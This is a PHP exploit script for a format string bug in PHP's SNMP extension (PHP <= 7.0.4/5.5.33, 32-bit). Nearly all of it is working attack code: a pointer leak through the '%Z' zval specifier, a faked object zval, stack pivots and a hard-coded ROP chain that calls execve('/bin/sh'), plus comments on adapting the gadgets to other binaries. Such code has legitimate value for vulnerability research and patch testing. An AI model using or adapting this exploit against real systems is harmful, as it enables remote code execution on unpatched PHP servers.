<?php

// PHP <= 7.0.4/5.5.33 SNMP format string exploit (32bit)
// By Andrew Kramer <andrew at jmpesp dot org>
// Should bypass ASLR/NX just fine

// This exploit utilizes PHP's internal "%Z" (zval)
// format specifier in order to achieve code-execution.
// We fake an object-type zval in memory and then bounce
// through it carefully.  First though, we use the same
// bug to leak a pointer to the string itself.  We can
// then edit the global variable with correct pointers
// before hitting it a second time to get EIP.  This
// makes it super reliable!  Like... 100%.
// To my knowledge this hasn't really been done before, but
// credit to Stefan Esser (@i0n1c) for the original idea.  It works!
// https://twitter.com/i0n1c/status/664706994478161920

// All the ROP gadgets are from a binary I compiled myself.
// If you want to use this yourself, you'll probably need
// to build a new ROP chain and find new stack pivots for
// whatever binary you're targeting.  If you just want to get
// EIP, change $stack_pivot_1 to 0x41414141 below.


// pass-by-reference here so we keep things tidy
function trigger(&$format_string) {

	$session = new SNMP(SNMP::VERSION_3, "127.0.0.1", "public");
	// you MUST set exceptions_enabled in order to trigger this
	$session->exceptions_enabled = SNMP::ERRNO_ANY;

	try {
		$session->get($format_string);
	} catch (SNMPException $e) {
		return $e->getMessage();
	}

}

// overwrite either $payload_{1,2} with $str at $offset
function overwrite($which, $str, $offset) {

	// these need to be global so PHP doesn't just copy them
	global $payload_1, $payload_2;

	// we MUST copy byte-by-byte so PHP doesn't realloc
	for($c=0; $c<strlen($str); $c++) {
		switch($which) {
			case 1:
				$payload_1[$offset + $c] = $str[$c];
				break;
			case 2:
				$payload_2[$offset + $c] = $str[$c];
				break;
		}
	}

}

echo "<h1> Setting up payloads </h1>";

//$stack_pivot_1 = pack("L", 0x41414141); // Just get EIP, no exploit
$stack_pivot_1 = pack("L", 0x0807c19f);	// xchg esp ebx
$stack_pivot_2 = pack("L", 0x0809740e);	// add esp, 0x14

// this is used at first to leak the pointer to $payload_1
$leak_str =	str_repeat("%d", 13) . $stack_pivot_2 . "Xw00t%lxw00t";
$trampoline_offset = strlen($leak_str);

// used to leak a pointer and also to store ROP chain
$payload_1 =
	$leak_str .						// leak a pointer
	"XXXX" .						// will be overwritten later
	$stack_pivot_1 .				// initial EIP (rop start)
	// ROP: execve('/bin/sh',0,0)
	pack("L", 0x080f0bb7) .			// xor ecx, ecx; mov eax, ecx
	pack("L", 0x0814491f) .			// xchg edx, eax
	pack("L", 0x0806266d) .			// pop ebx
	pack("L", 0x084891fd) .			// pointer to /bin/sh
	pack("L", 0x0807114c) .			// pop eax
	pack("L", 0xfffffff5) .			// -11
	pack("L", 0x081818de) .			// neg eax
	pack("L", 0x081b5faa);			// int 0x80

// used to trigger the exploit once we've patched everything
$payload_2 =
	"XXXX" .						// will be overwritten later
	"XXXX" .						// just padding, whatevs
	"\x08X" .						// zval type OBJECT
	str_repeat("%d", 13) . "%Z";	// trigger the exploit

// leak a pointer
echo "<h3> Attempting to leak a pointer </h3>";
$data = trigger($payload_1);
$trampoline_ptr = (int)hexdec((explode("w00t", $data)[1])) + $trampoline_offset;
echo "<h3> Leaked pointer: 0x" . dechex($trampoline_ptr) . "</h3>";

// If there are any null bytes or percent signs in the pointer, it will break
// the -0x10 will be applied later, so do it now too
if(strpos(pack("L", $trampoline_ptr - 0x10), "\x00") !== false
|| strpos(pack("L", $trampoline_ptr - 0x10), "%") !== false) {
	echo "<h3> That pointer has a bad character in it </h3>";
	echo "<h3> This won't work.  Bailing out... :(</h3>";
	exit(0);
}

echo "<h3> Overwriting payload with calculated offsets </h3>";
// prepare the trampoline
// code looks kinda like...
//   mov eax, [eax+0x10]
//   mov eax, [eax+0x54]
//   call eax
overwrite(2, pack("L", $trampoline_ptr - 0x10), 0);
overwrite(1, pack("L", $trampoline_ptr - 0x54 + 4), $trampoline_offset);

// exploit
echo "> Attempting to pop a shell\n";
trigger($payload_2);

// if we make it here, something didn't work
echo "> Exploit failed :(\n";

?>
